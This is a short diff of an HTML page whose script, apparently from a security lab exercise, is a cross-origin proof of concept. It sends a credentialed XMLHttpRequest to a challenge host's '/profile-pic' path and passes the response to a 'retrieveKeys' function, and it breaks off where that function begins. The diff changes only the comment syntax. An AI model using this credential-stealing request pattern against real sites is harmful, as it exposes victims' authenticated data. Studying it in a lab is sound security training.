@@ -2,20 +2,20 @@
   <body>
     <script>
 
-    #Initialize the XMLHttpRequest object, and the application URL vairable 
+    // Initialize the XMLHttpRequest object, and the application URL vairable 
         var req = new XMLHttpRequest();
         var url = ("https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar");
 
-    #MLHttpRequest object loads, exectutes reqListener() function
+    // MLHttpRequest object loads, exectutes reqListener() function
       req.onload = retrieveKeys;
 
-    #Make GET request to the application accounDetails location
+    // Make GET request to the application accounDetails location
         req.open('GET', url + "/profile-pic",true);
 
-    #Allow passing credentials with the requests
+    // Allow passing credentials with the requests
     req.withCredentials = true;
 
-    #Send the request 
+    // Send the request 
         req.send(null);
 
     function retrieveKeys() {
